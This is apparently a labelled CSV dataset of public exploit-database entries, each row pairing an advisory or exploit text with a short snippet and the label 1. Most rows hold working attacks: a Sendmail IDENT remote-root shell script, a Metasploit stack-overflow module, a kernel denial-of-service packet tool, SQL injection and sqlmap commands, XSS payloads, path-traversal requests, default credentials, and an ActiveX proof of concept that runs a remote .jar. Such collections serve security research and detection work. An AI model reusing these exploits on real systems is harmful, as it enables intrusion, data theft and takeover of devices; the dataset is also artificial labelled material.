45200,"ASUSTOR ADM 3.1.0.RFQ3 - Remote Command Execution / SQL Injection Product - ASUSTOR ADM - 3.1.0.RFQ3 and all previous builds Vendor - https://www.asustor.com/ Patch Notes - http://download.asustor.com/download/docs/releasenotes/RN_ADM_3.1.3.RHU2.pdf  Issue:  The Asustor NAS appliance on ADM 3.1.0 and before suffer from multiple critical vulnerabilities. The vulnerabilities were submitted to Asustor in January and February 2018. Several follow-up requests were made in an attempt to obtain vendor acknowledgement, however no correspondance was ever received. Nevertheless, the vendor did patch the RCE issue in the 3.1.3 ADM release on May 31, 2018.  Resolution: Upgrade to newest Asustor firmware, ADM 3.1.3. -----------------------------------------------------------------------------------  CVE-2018-11510 Remote Command Execution (Unauthenticated) CWE-78 - Improper Neutralization of Special Elements used in an OS Command ASUSTOR ADM - 3.1.0.RFQ3 ------------------------------------------  Weakness : The ASUSTOR ADM 3.1.0.RFQ3 NAS portal suffers from an unauthenticated remote code execution vulnerability in the portal/apis/aggrecate_js.cgi file by embedding OS commands in the 'script' parameter. The application fails to santitize user input after the cgi file executes a call to a local shell script.  Example POC: https://<IP>:8001/portal/apis/aggrecate_js.cgi?script=launcher%22%26ls%20-ltr%26%22  Exploitation of this vulnerability allows an attacker execution of arbitrary commands on the host operating system, as the root user, remotely and unauthenticated. This is a complete compromise of the appliance.  Exploits with Metasploit module can be found here: https://github.com/mefulton/CVE-2018-11510/ ------------------------------------------------------------------------------------  CVE-2018-11511 Blind SQL Injections CWE-89: Improper Neutralization of Special Elements used in an SQL Command ASUSTOR Photo Gallery Application - ADM 3.1.0.RFQ3 ------------------------------------------  Weakness : The tree list functionality in the photo gallery application in ASUSTOR ADM 3.1.0.RFQ3 has a SQL injection vulnerability that affects the 'album_id' or 'scope' parameter via a photo-gallery/api/album/tree_lists/ URI.  POC sqlmap -u ""https://<IP>/photo-gallery/api/album/tree_lists/"" --data=""album_id=123456789&start=0&limit=100&order=name_asc&api=v2""   --random-agent --risk=2 --dbms=mysql  Parameter: album_id (POST)     Type: boolean-based blind     Title: AND boolean-based blind - WHERE or HAVING clause     Payload: album_id=106299411 AND 4644=4644&start=0&limit=100&order=name_asc&api=v2      Type: AND/OR time-based blind     Title: MySQL >= 5.0.12 AND time-based blind     Payload: album_id=106299411 AND SLEEP(5)&start=0&limit=100&order=name_asc&api=v2   sqlmap -u ""https://IP/photo-gallery/api/photo/search/"" --data=""keyword=jpg&scope=123456789&start=0&limit=100&order=name_asc&api_mode=browse&api=v2"" --random-agent --dbms=mysql --risk=2  Parameter: scope (POST)     Type: AND/OR time-based blind     Title: MySQL >= 5.0.12 AND time-based blind     Payload: keyword=jpg&scope=106299414 AND SLEEP(5)&start=0&limit=100&order=name_asc&api_mode=browse&api=v2 ------------------------------------------------------------------------------------  CVE-2018-11509 Default credentials and remote access (Multiple Applications) CWE-255 Credentials Management ASUSTOR ADM 3.1.0.RFQ3 ------------------------------------------  Weakness : When the end user completes setup for the ASUSTOR Nas appliance, a single congratulations web page appears, usually on port 80, stating setup is complete. This ""setup complete"" web page however is served publicly, and is available to anyone with no authentication. >From this page it is possible to access all of the add-on applications the end usr installs on the NAS, which are available from their online repository, by simply browsing to each add-on directory.  For many of these apps, for example phpmyadmin. virtualbox, owncloud, photo-gallery, etc., the files are installed under the /volume1/Web/ folder, which is t the same directory as the 'setup complete' page is located.  URL http://<IP>/phpmyadmin/ username/password - root:admin URL http://<IP>/virtualbox/ username/password - admin:admin URL http://<IP>/wordpress/ setup file available  The application does prompt the user to change the admin account for the NAS itself, however, the end user is never prompted to change the default passwords on the add-on  applications.  This allows an attacker root level access to the application which in turn can be used to upload a webshell onto the appliance. It also allow access to all data the end user uploads to the NAS.  Furthermore, the NAS itself has a default account nvradmin, which has permission to log into the admin portal. While the nvradmin account does not have most admin permissions, it still allows an attacker to access many of the browser file functions, and gain a foothold on the appliance.  URL http://<IP>:8001/portal/ username/password nvradmin:nvradmin  An attacker can determine installed applications and attack default credentials that are not changed upon NAS initialization, which enables them to  compromise end user data or gain root access on the appliance. -----------------------------------------------------------------------------------  [Researchers] Kyle Lovett - (twitter - @SquirrelBuddha) Matthew Fulton (twitter - @haqur) https://www.purehacking.com/blog/matthew-fulton/ https://github.com/mefulton/CVE-2018-11510/",embedding OS commands in the 'script' parameter,1
18259,"Infoproject Business Hero - Multiple Vulnerabilities Infoproject Biznis Heroj (login.php) Authentication Bypass Vulnerability   Vendor: Infoproject DOO Product web page: http://www.biznisheroj.mk Affected version: Plus, Pro and Extra  Summary: Biznis Heroj or Business Hero (Áèçíèñ Õåðî¼) is the first software on the Macedonian market that will help you manage your business processes in your company, such as accounting, production, acquisition, archiving, inventory, and the Cloud. Using the Cloud technology, Biznis Heroj allows you to access the system from any computer at any time through any internet browser.  Desc: The vulnerability is caused due to an error in the logon authentication script (login.php) and can be exploited to bypass the login procedure by defining the 'username' and 'password' POST parameters with an SQL Injection attack, gaining admin privileges.  Tested on: Apache, PHP   Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                             liquidworm gmail com   Vendor status:  [14.12.2011] Vulnerability discovered. [15.12.2011] Contact with the vendor. [20.12.2011] No response from the vendor. [21.12.2011] Public security advisory released.   Advisory ID: ZSL-2011-5065 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5065.php   14.12.2011  ---   PoC:  https://[TARGET]/login.php  Username: ' or 1=1-- Password: ' or 1=1--   Infoproject Biznis Heroj (XSS/SQLi) Multiple Remote Vulnerabilities   Vendor: Infoproject DOO Product web page: http://www.biznisheroj.mk Affected version: Plus, Pro and Extra  Summary: Biznis Heroj or Business Hero (Áèçíèñ Õåðî¼) is the first software on the Macedonian market that will help you manage your business processes in your company, such as accounting, production, acquisition, archiving, inventory, and the Cloud. Using the Cloud technology, Biznis Heroj allows you to access the system from any computer at any time through any internet browser.  Desc: Input passed via the parameters 'filter' in 'widget.dokumenti_lista.php' and 'fin_nalog_id' in 'nalozi_naslov.php' script are not properly sanitised before being returned to the user or used in SQL queries. This can be exploited to manipulate SQL queries by injecting arbitrary SQL code. The param 'config' in 'nalozi_naslov.php' and 'widget.dokumenti_lista.php' is vulnerable to a XSS issue where the attacker can execute arbitrary HTML and script code in a user's browser session in context of an affected site.  Tested on: Apache, PHP   Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                             liquidworm gmail com   Vendor status:  [14.12.2011] Vulnerability discovered. [15.12.2011] Contact with the vendor. [20.12.2011] No response from the vendor. [21.12.2011] Public security advisory released.   Advisory ID: ZSL-2011-5064 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5064.php   14.12.2011  ---   XSS:  https://[TARGET]/prg_finansovo/nalozi_naslov.php?fin_nalog_id=140&config=alert(1); https://[TARGET]/widgets/widget.dokumenti_lista.php?config=alert(1);&bl=porackakupuvac&framenum=1   SQLi:  - POST https://[TARGET]/widgets/widget.dokumenti_lista.php  action=dok_naslov_lista_sindzir&config=porackakupuvac&grid_strana=celen& bl=porackakupuvac&magacin_id=1&magacin_config=1&magacin_celen_id=1&magacin_celen_config=1& magacin_izvoren_id=1&magacin_izvoren_config=1&dokument_tip_id=PORACKAKUPUVACML& dokument_tip_config=PORACKAKUPUVACML&dokument_tip_celen_id=PORACKAKUPUVACML& dokument_tip_celen_config=PORACKAKUPUVACML&dokument_tip_izvoren_id=PORACKAKUPUVACML& dokument_tip_izvoren_config=PORACKAKUPUVACML&dokument_tip_sleden_id=NALOGISPORAKA& order=dok_naslov.datum_dokument desc, dok_naslov.sifra desc & filter=dok_naslov.datum_dokument between '2011-11-15' and '2011-12-15'&offset=& limit=50&widget=1   - GET https://[TARGET]/prg_finansovo/nalozi_naslov.php?fin_nalog_id=140[SQLi]&config=default",injecting arbitrary SQL code,1
20599,"Sendmail 8.6.9 IDENT - Remote Command Execution source: https://www.securityfocus.com/bid/2311/info  A vulnerability in the IDENT function of sendmail 8.6.9 allows attackers to obtain remote root access. Very little other information on this vulnerability is currently available; this is an old vulnerability.    it for sm869 or worse # identd must not be enabled (port 113 must be free)  # this must be a host that mail can go to (MX not pointing elsewhere) # that we cant reach right now (ie. host doesnt exist anymore) UNREACHABLE=""goofy.uhcc.hawaii.edu""  # Commands to run on remote host COMMANDS=""cat /etc/passwd""  # what host to run it on TARGET=""foobar.all.net""  # work in a temp dir TD=/tmp/.Xwork.$$ mkdir $TD cd $TD  cat > a.c <<_END_ #include <sys/types.h> #include <sys/socket.h> #include <netinet/in.h>  /* run body of mail through shell run as daemon */ #define REPLY ""USERID : UNIX : a\nC:daemon\nR\""|sed '1,/^$/d'|/bin/sh\""\nHXxx: ""  #ifdef other_possibilities /* write to a file as daemon */ #define REPLY ""USERID : UNIX : a\nC:daemon\nR/tmp/writeme\nHXxx: "" /* send back a file to someone and erase it */ #define REPLY ""USERID : UNIX : a\nD/tmp/sendtome\nRemmanuel@2600.com\nHXxx: "" #endif  readline(fd, buf, len) char *buf; {     int i = 0;      while(i < len && read(fd, &buf[i], 1) == 1 && buf[i]) {        if(buf[i] == '\r' || buf[i] == '\n')            break;        i++;     }     buf[i] = '\0'; }  die(str) char *str; {     perror(str); exit(1); }  main() {     int s, s2, adlen;     struct sockaddr_in ad;     char buf[60];      ad.sin_family = AF_INET;     ad.sin_port = htons(113);     ad.sin_addr.s_addr = INADDR_ANY;     if((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) die(""socket"");     if(bind(s, (struct sockaddr *)&ad, sizeof(ad)) == -1) die(""bind"");     if(listen(s, 1) == -1) die(""listen"");     adlen = sizeof(ad);     s2 = accept(s, (struct sockaddr *)&ad, &adlen);     if(s2 == -1) die(""accept"");     printf(""Connection from %s port %d\n"",          inet_ntoa(ad.sin_addr), ntohs(ad.sin_port));     readline(s2, buf, 50);     sprintf(buf + strlen(buf), "" : %s\n"", REPLY);     write(s2, buf, strlen(buf)); } _END_  # compile program echo ""compiling"" cc a.c -o ident echo ""running fake ident"" ./ident &  # send to reomte echo ""talking to remote"" (   sleep 1; echo ""helo""   sleep 1; echo ""mail from: <dan>""   sleep 1; echo ""rcpt to: <bounce@$UNREACHABLE>""   sleep 1; echo ""data""   echo ""$COMMANDS""   echo "".""   sleep 1; echo ""quit""   sleep 5 ) | telnet $TARGET 25  # cleanup cd / rm -rf $TD echo ""done.""",whereby specially crafted e-mail headers,1
44931,"WordPress Plugin Advanced Order Export For WooCommerce < 1.5.4 - CSV Injection # Exploit Title: Wordpress Plugin Advanced Order Export For WooCommerce < 1.5.4 - CSV Injection # Google Dork: N/A # Date: 2018-06-24 # Exploit Author: Bhushan B. Patil # Software Link: https://wordpress.org/plugins/woo-order-export-lite/ # Affected Version: 1.5.4 and before # Category: Plugins and Extensions # Tested on: WiN7_x64 # CVE: CVE-2018-11525  # 1. Application Description: # The plugin helps you to easily export WooCommerce order data. Export any custom field assigned  # to orders/products/coupons is easy and you can select from various formats to export the data  # in such as CSV, XLS, XML and JSON.  # 2. Technical Description: # Advanced Order Export For WooCommerce plugin version 1.5.4 and before are affected by the vulnerability # Remote Command Execution using CSV Injection. This allows a public user to inject commands as a part of  # form fields and when a user with higher privilege exports the form data in CSV opens the file on their machine, # the command is executed.  # 3. Proof Of Concept:   Enter the payload @SUM(1+1)*cmd|' /C calc'!A0 in the form fields and submit.  # When high privileged user logs into the application to export form data in CSV and opens the file. # Formula gets executed and calculator will get popped in his machine.",CSV Injection,1
4047,"SafeNet High Assurance Remote 1.4.0 - 'IPSecDrv.sys' Remote Denial of Service /* safenet-dos.c  *  * SafeNet HighAssurance Remote ~1.4.0 Ring0 DoS (win32)  * by John Anderson <john@ev6.net>  *    mu-b <mu-b@digit-labs.org>  * - Mar 2006 - June 2007  *  * - Tested on: SafeNet HighAssurance Remote 1.4.0 (Build 12) (win32)  *  * Kernel level (Ring0) DoS in IPv6 support of IPSecDrv.sys  * (causes an infinite loop in searching option headers 0x1000BEB0).  *  * This POC only works on a local subnet since it sends an invalid packet  * and any sensible router will drop it. However, this is exploitable  * remotely with IPv6.  */  #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #include <sys/types.h> #include <libnet.h> #include <sys/time.h>  #define IPV4_HDR_LEN  20 #define IPV6_HDR_LEN  40 #define UDP_LEN       16  struct opt {   u_char nxt_hdr;   u_char opt_len; };  unsigned long int lookup (char *hostname) {   struct hostent *name;   unsigned long int address;    if ((address = inet_addr (hostname)) != -1)     return address;   if ((name = gethostbyname (hostname)) == NULL)     return -1;    memcpy (&address, name->h_addr, name->h_length);   return (address); }  int main (int argc, char **argv) {   u_char *buf = NULL;    /* libnet vars */   char errbuf[LIBNET_ERRBUF_SIZE];   libnet_t *lnsock;   char *device = NULL;    /* packet vars */   struct ip *ip_hdr = NULL;   struct opt *opt_hdr = NULL;   u_int32_t src_ip = 0, dst_ip = 0;    printf (""SafeNet HighAssurance Remote ~1.4.0 Ring0 DoS POC\n""           ""by John Anderson <john@ev6.net>\n""           ""   mu-b <mu-b@digit-labs.org>\n\n"");    if (!argv[1])     {       printf (""Usage: %s <destination> [source]\n"", argv[0]);       exit (EXIT_FAILURE);     }    /* allocate space for packet */   if ((buf = malloc (IPV6_HDR_LEN + UDP_LEN)) == NULL)     {       perror (""malloc: "");       exit (EXIT_FAILURE);     }    /* initialise libnet */   lnsock = libnet_init (LIBNET_RAW4_ADV, device, errbuf);   if (lnsock == NULL)     {       fprintf (stderr, ""libnet_init() failed: %s"", errbuf);       exit (-1);     }    if (!argv[2])     src_ip = lookup (""127.0.0.1"");   else     src_ip = lookup (argv[2]);    dst_ip = lookup (argv[1]);    /* Build the pseudo-IPv4 header */   memset (buf, 0, sizeof buf);   ip_hdr = (struct ip *) buf;   ip_hdr->ip_v = 6;   ip_hdr->ip_hl = 0;   ip_hdr->ip_tos = 0;   ip_hdr->ip_len = htons (IPV6_HDR_LEN + UDP_LEN);   ip_hdr->ip_id = htons (0);   ip_hdr->ip_off = htons (0);   ip_hdr->ip_ttl = 0;   ip_hdr->ip_p = 0;   ip_hdr->ip_sum = 0;   ip_hdr->ip_src.s_addr = src_ip;   ip_hdr->ip_dst.s_addr = dst_ip;    /* Build option header with poison bytes */   opt_hdr = (struct opt *) (buf + IPV6_HDR_LEN);   opt_hdr->nxt_hdr = 0x3C;      /* != 0x3B */   opt_hdr->opt_len = 0x07;      /* length n such that:-                                  *(((u_char *)opt_hdr) + n * 2) != 0x3B &&                                  *(((u_char *)opt_hdr) + n * 2 + 1) == 0x00 &&                                  n * 2 < IPV6_HDR_LEN + UDP_LEN */                                 /* a value of 0x00 will suffice!@$%! */    printf (""Attacking %s"", argv[1]);   libnet_write_raw_ipv4 (lnsock, buf, IPV6_HDR_LEN + UDP_LEN);   printf ("".\n"");    return (EXIT_SUCCESS); }  // milw0rm.com [2007-06-08]",sends an invalid packet,1
16451,"eIQNetworks ESA - License Manager LICMGR_ADDLICENSE Overflow (Metasploit) ## # $Id: eiqnetworks_esa.rb 10394 2010-09-20 08:06:27Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = AverageRanking  	include Msf::Exploit::Remote::Tcp  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'eIQNetworks ESA License Manager LICMGR_ADDLICENSE Overflow', 			'Description'    => %q{ 					This module exploits a stack buffer overflow in eIQnetworks 				Enterprise Security Analyzer. During the processing of 				long arguments to the LICMGR_ADDLICENSE command, a stack-based 				buffer overflow occurs. This module has only been tested 				against ESA v2.1.13. 			}, 			'Author'         => [ 'MC', 'ri0t <ri0t[at]ri0tnet.net>',  'kf' ], 			'Version'        => '$Revision: 10394 $', 			'References'     => 				[ 					['CVE', '2006-3838'], 					['OSVDB', '27526'], 					['BID', '19163'], 					['URL', 'http://www.zerodayinitiative.com/advisories/ZDI-06-024.html'], 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'seh', 				}, 			'Payload'        => 				{ 					'Space'    => 400, 					'BadChars' => ""\x00"", 					'PrependEncoder' => ""\x81\xc4\xff\xef\xff\xff\x44"", 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					['EnterpriseSecurityAnalyzerv21 Universal', { 'Ret' => 0x00448187, 'Offset' => 494 } ],  					['EiQ Enterprise Security Analyzer Offset 494 Windows 2000 SP0-SP4 English',    { 'Ret' =>  0x750316e2, 'Offset' => 494 } ],   # call ebx 					['EiQ Enterprise Security Analyzer Offset 494 Windows XP English SP1/SP2',      { 'Ret' =>  0x77db64dc, 'Offset' => 494 } ],	# jmp ebx 					['EiQ Enterprise Security Analyzer Offset 494 Windows Server 2003 SP0/SP1',     { 'Ret' =>  0x77d16764, 'Offset' => 494 } ],   # jmp EBX 					['Astaro Report Manager (OEM) Offset 1262 Windows 2000 SP0-SP4 English',        { 'Ret' =>  0x750316e2, 'Offset' => 1262 } ], 					['Astaro Report Manager (OEM) Offset 1262 Windows XP English SP1/SP2',          { 'Ret' =>  0x77db64dc, 'Offset' => 1262 } ], 					['Astaro Report Manager (OEM) Offset 1262 Windows Server 2003 English SP0/SP1', { 'Ret' =>  0x77d16764, 'Offset' => 1262 } ], 					['Fortinet FortiReporter (OEM) Offset 1262 Windows 2000 SP0-SP4 English',       { 'Ret' =>  0x750316e2, 'Offset' => 1262 } ], 					['Fortinet FortiReporter (OEM) Offset 1262 Windows XP English SP1/SP2',         { 'Ret' =>  0x77db64dc, 'Offset' => 1262 } ], 					['Fortinet FortiReporter (OEM) Offset 1262 Windows Server 2003 English SP0/SP1',{ 'Ret' =>  0x77d16764, 'Offset' => 1262 } ], 					['iPolicy Security Reporter (OEM) Offset 1262 Windows 2000 SP0-SP4 English',    { 'Ret' =>  0x750316e2, 'Offset' => 1262 } ], 					['iPolicy Security Reporter (OEM) Offset 1262 Windows XP English SP1/SP2',          { 'Ret' =>  0x77db64dc, 'Offset' => 1262 } ], 					['iPolicy Security Reporter (OEM) Offset 1262 Windows Server 2003 English SP0/SP1', { 'Ret' =>  0x77d16764, 'Offset' => 1262 } ], 					['SanMina Viking Multi-Log Manager (OEM) Offset 1262 Windows 2000 SP0-SP4 English', { 'Ret' =>  0x750316e2, 'Offset' => 1262 } ], 					['SanMina Viking Multi-Log Manager (OEM) Offset 1262 Windows XP English SP1/SP2',   { 'Ret' =>  0x77db64dc, 'Offset' => 1262 } ], 					['SanMina Viking Multi-Log Manager (OEM) Offset 1262 Windows Server 2003 English SP0/SP1', { 'Ret' =>  0x77d16764, 'Offset' => 1262 } ], 					['Secure Computing G2 Security Reporter (OEM) Offset 1262 Windows 2000 SP0-SP4 English',   { 'Ret' =>  0x750316e2, 'Offset' => 1262 } ], 					['Secure Computing G2 Security Reporter (OEM) Offset 1262 Windows XP English SP1/SP2',     { 'Ret' =>  0x77db64dc, 'Offset' => 1262 } ], 					['Secure Computing G2 Security Reporter (OEM) Offset 1262 Windows Server 2003 English SP0/SP1', { 'Ret' =>  0x77d16764, 'Offset' => 1262 } ], 					['Top Layer Network Security Analyzer (OEM) Offset 1262 Windows 2000 SP0-SP4 English',          { 'Ret' =>  0x750316e2, 'Offset' => 1262 } ], 					['Top Layer Network Security Analyzer (OEM) Offset 1262 Windows XP English SP1/SP2',            { 'Ret' =>  0x77db64dc, 'Offset' => 1262 } ], 					['Top Layer Network Security Analyzer (OEM) Offset 1262 Windows Server 2003 English SP0/SP1',   { 'Ret' =>  0x77d16764, 'Offset' => 1262 } ], 				], 			'Privileged'     => false, 			'DisclosureDate' => 'Jul 24 2006' 			))  		register_options( 			[ 				Opt::RPORT(10616) 			], self.class) 	end  	def exploit 		connect  		print_status(""Trying target #{target.name}..."")  		filler =  rand_text_english(1) * (target['Offset'] - payload.encoded.length) 		sploit =  ""LICMGR_ADDLICENSE&"" + filler + payload.encoded + [target.ret].pack('V') +  ""&"";  		sock.put(sploit)  		handler 		disconnect 	end  end",long arguments to the LICMGR_ADDLICENSE command,1
21206,"PHP-Nuke AddOn PHPToNuke.php 1.0 - Cross-Site Scripting source: https://www.securityfocus.com/bid/3807/info  phptonuke.php is a PHPNuke AddOn script to insert a PHP script into the middle of a PHPNuke site. It is written and maintained by Lebios.  It is possible for a malicious user to create a link to the phptonuke.php script which contains script code. When an unsuspecting web user browses the link, the script code will be executed in their browser in the context of the PHPNuke site.  This type of attack may be used to hijack a legitimate user's session via theft of cookie-based authentication credentials.  http://phpnukesite/phptonuke.php?filnavn=<script>alert(document.cookie)</script>",create a link to the phptonuke.php script which contains script code,1
47340,"Alkacon OpenCMS 10.5.x - Local File inclusion # Exploit Title: Alkacon OpenCMS 10.5.x - Multiple LFI in Alkacon OpenCms Site Management # Google Dork: N/A # Date: 18/07/2019 # Exploit Author: Aetsu # Vendor Homepage: http://www.opencms.org # Software Link: https://github.com/alkacon/opencms-core # Version: 10.5.x # Tested on: 10.5.5 / 10.5.4 # CVE : CVE-2019-13237  For the tests, I used the payloads: ``` …%2f…%2fWEB-INF%2flogs%2fopencms.log …%2f…%2fWEB-INF%2fweb.xml ```  1. Affected resource closelink: POC: ``` POST /system/workplace/admin/workplace/loginmessage.jsp HTTP/1.1 Host: example.com enabled.0=true&enabled.0.value=true&message.0=%3Cimg+src%3D.+onerror%3Dalert%281%29%3E%0D%0A&loginForbidden.0.value=false&timeStart.0=1%2F3%2F2000+12%3A00+AM&ok=Ok&elementname=undefined&path=%252Fworkplace%252Floginmessage&elementindex=0&action=save&closelink=..%2f..%2fWEB-INF%2fweb.xml&style=new&page=page1&framename= ``` 2. Affected resource closelink: POC: ``` POST /system/workplace/admin/contenttools/reports/xmlcontentrepair.jsp HTTP/1.1 Host: example.com reporttype=extended&reportcontinuekey=&thread=dcbb6737-661b-11e9-a9fc-0242ac11002b&threadhasnext=false&action=reportend&closelink=..%2f..%2fWEB-INF%2fweb.xml&style=new&ok=Ok ``` 3. Affected resource closelink: POC: ``` POST /system/workplace/admin/accounts/group_new.jsp HTTP/1.1 Host: example.com name.0=%3Cimg+src%3D.+onerror%3Dalert%28%27Name%27%29%3E&description.0=%3Cimg+src%3D.+onerror%3Dalert%28%27Description%27%29%3E&assignedOu.0=root+organizational+unit+%28%2F%29&enabled.0=true&enabled.0.value=true&ok=Ok&oufqn=&elementname=undefined&path=%252Faccounts%252Forgunit%252Fgroups%252Fnew&elementindex=0&action=save&closelink=..%2f..%2fWEB-INF%2fweb.xml&style=new&page=page1&framename= ``` 4. Affected resource closelink: POC: ``` POST /system/workplace/admin/history/settings/index.jsp HTTP/1.1 Host: example.com versions.0=10&mode.0=2&ok=OK&elementname=undefined&path=%252Fhistory%252Fsettings&elementindex=0&action=save&closelink=..%2f..%2fWEB-INF%2fweb.xml&style=new&page=page1&framename= ``` 5. Affected resource closelink: POC: ``` POST /system/workplace/admin/history/reports/clearhistory.jsp HTTP/1.1 Host: example.com reporttype=extended&reportcontinuekey=&thread=ac0bbd5f-66cd-11e9-ae09-0242ac11002b&classname=org.opencms.workplace.tools.history.CmsHistoryClearDialog&threadhasnext=false&action=reportend&closelink=..%2f..%2fWEB-INF%2fweb.xml&style=new&ok=OK ```   Extended POCs: https://aetsu.github.io/OpenCms",a specially crafted .jsp file,1
22826,"VisNetic WebMail 5.8.6 .6 - Information Disclosure source: https://www.securityfocus.com/bid/8018/info  VisNetic WebMail is prone to an information disclosure vulnerability. Reportedly, by appending a dot '.' character to the end of a URI request to WebMail, the source code of PHP files may be returned in the web browser.  http://webmailhost:32000/mail/admin/../include.html. http://webmailhost:32000/mail/admin/../settings.html.",appending a dot '.' character to the end of a URI request to WebMail,1
25713,"SIEMENS Solid Edge ST4/ST5 WebPartHelper - ActiveX RFMSsvs!JShellExecuteEx Remote Code Execution SIEMENS Solid Edge ST4/ST5 WebPartHelper ActiveX Control  RFMSsvs!JShellExecuteEx Remote Command Execution   Tested against: Microsoft Windows Server 2003 r2 sp2                 Microsoft Windows XP sp3                 Microsoft Windows 7                 Internet Explorer 8  Software description: http://en.wikipedia.org/wiki/Solid_Edge  vendor site: http://www.siemens.com/entry/cc/en/  Download url: http://www.plm.automation.siemens.com/en_us/products/velocity/forms/solid-edge-student.cfm  File tested: SolidEdgeV104ENGLISH_32Bit.exe  Background:  The mentioned software installs an ActiveX control with  the following settings:  CLSID: {DD568718-FF20-48EA-973F-0BD5C9FCA522} Progid: SolidEdge.WebPartHelper.1 Binary Path: C:\Program Files\Solid Edge ST4\Program\WPHelper.dll Implements IObjectSafety: True Safe For Initialization (IObjectSafety): False Safe For Scripting (IObjectSafety): True  This control *implements* IObjectSafety: IE will query through the IObjectSafety interface for ""Safe for Initialization with data"" and ""Safe For Scripting"".  According to IObjectSafety interface, this control is Safe for Scripting  then IE  will allow scripting of this control according to browser security settings.  vulnerability:  the WebPartHelper Class offers the OpenInEditor() method, see typelib:  ...   /* DISPID=8 */ function OpenInEditor(         /* VT_VARIANT [12] [in] */ $URL         ) { } ...  By passing an null session share path to the URL argument of this method is possible to launch an arbitrary executable.  This is because of a ShellExecuteExW() call inside RFMSsvs.dll  Call stack when ShellExecuteExW() is called:  Address    Stack      Procedure / arguments                 Called from                   Frame 01B7E140   04AC9F0E   SHELL32.ShellExecuteExW               RFMSsvs.04AC9F08              01B7F280 01B7F284   022B71AD   ? <jmp.&RFMSsvs.JShellExecuteEx>      WPHelper.022B71A8             01B7F280 01B7F560   022B85B6   WPHelper.022B6D70                     WPHelper.022B85B1             01B7F55C 01B7F5D4   022B87A5   ? WPHelper.022B8380                   WPHelper.022B87A0             01B7F5D0 01B7F620   022B89CB   WPHelper.022B8710                     WPHelper.022B89C6             01B7F61C 01B7F668   7D0E5186   Includes WPHelper.022B89CB            OLEAUT32.7D0E5184             01B7F664 01B7F690   7D0F4ACF   ? OLEAUT32.DispCallFunc               OLEAUT32.7D0F4ACA             01B7F68C 01B7F720   022B58C3   Includes OLEAUT32.7D0F4ACF            WPHelper.022B58C1             01B7F71C 01B7F748   40302C02   Includes WPHelper.022B58C3            jscript.40302BFF              01B7F744 01B7F784   40302B6F   jscript.40302B90                      jscript.40302B6A              01B7F780 01B7F7C0   40302AFA   jscript.40302B2E                      jscript.40302AF5              01B7F7BC 01B7F834   40303555   ? jscript.40302A88                    jscript.40303550              01B7F830 01B7F878   40301221   jscript.4030122A                      jscript.4030121C              01B7F874 01B7F8B8   403011D6   jscript.403011E1                      jscript.403011D1              01B7F8B4 01B7F8DC   4030312D   jscript.40301182                      jscript.40303128              01B7F8D8   WPHelper.dll: ... 022B718A   899D 74FDFFFF    mov dword ptr ss:[ebp-28C],ebx 022B7190   8D85 D8FDFFFF    lea eax,dword ptr ss:[ebp-228] 022B7196   50               push eax 022B7197   8D8D 60FDFFFF    lea ecx,dword ptr ss:[ebp-2A0] 022B719D   51               push ecx 022B719E   C785 7CFDFFFF 01>mov dword ptr ss:[ebp-284],1 022B71A8   E8 ADBB0100      call <jmp.&RFMSsvs.JShellExecuteEx> ...   RFMSsvs.dll: ... 04AC9ECF   8B85 A4EFFFFF    mov eax,dword ptr ss:[ebp-105C] 04AC9ED5   8D8D 4CEFFFFF    lea ecx,dword ptr ss:[ebp-10B4] 04AC9EDB   8946 24          mov dword ptr ds:[esi+24],eax 04AC9EDE   FF15 0CE3CB04    call dword ptr ds:[<&JUtil.??BGUserText@@QBEPB_WXZ>]                    ; JUtil.??BGUserText@@QBEPB_WXZ 04AC9EE4   8946 10          mov dword ptr ds:[esi+10],eax 04AC9EE7   C645 FC 02       mov byte ptr ss:[ebp-4],2 04AC9EEB   8D8D D8EEFFFF    lea ecx,dword ptr ss:[ebp-1128] 04AC9EF1   E8 6A89F1FF      call RFMSsvs.??1JrfmsFileName@@QAE@XZ 04AC9EF6   EB 0F            jmp short RFMSsvs.04AC9F07 04AC9EF8   8D8D 84EFFFFF    lea ecx,dword ptr ss:[ebp-107C] 04AC9EFE   FF15 0CE3CB04    call dword ptr ds:[<&JUtil.??BGUserText@@QBEPB_WXZ>]                    ; JUtil.??BGUserText@@QBEPB_WXZ 04AC9F04   8946 10          mov dword ptr ds:[esi+10],eax        ; eax -> ""\\192.168.2.100\uncshare\CmdExec.jar"" 04AC9F07   56               push esi 04AC9F08   FF15 E8E6CB04    call dword ptr ds:[<&SHELL32.ShellExecuteExW>]                          ; SHELL32.ShellExecuteExW ...  As attachment, proof of concept code. Note that by pointing OpenInEditor() (and consequently ShellExecuteExW() )  to a remote .jar file as handled in JRE/JDK7u21 is possible to bypass the usual confirmation box.  <!-- SIEMENS Solid Edge WebPartHelper ActiveX Control RFMSsvs!JShellExecuteEx Remote Command Execution PoC  CLSID: {DD568718-FF20-48EA-973F-0BD5C9FCA522} Progid: SolidEdge.WebPartHelper.1 Binary Path: C:\Program Files\Solid Edge ST4\Program\WPHelper.dll Implements IObjectSafety: True Safe For Initialization (IObjectSafety): False Safe For Scripting (IObjectSafety): True --> <!-- saved from url=(0014)about:internet --> <html> <script>    var obj = new ActiveXObject(""SolidEdge.WebPartHelper.1"");       //launch calc.exe   //obj.OpenInEditor(""c:\\windows\\system32\\calc.exe"");    //bypass the confirmation box, JRE/JDK7u21   obj.OpenInEditor(""\\\\192.168.0.1\\uncshare\\CmdExec.jar"");   </script>",a specially crafted .jar file,1
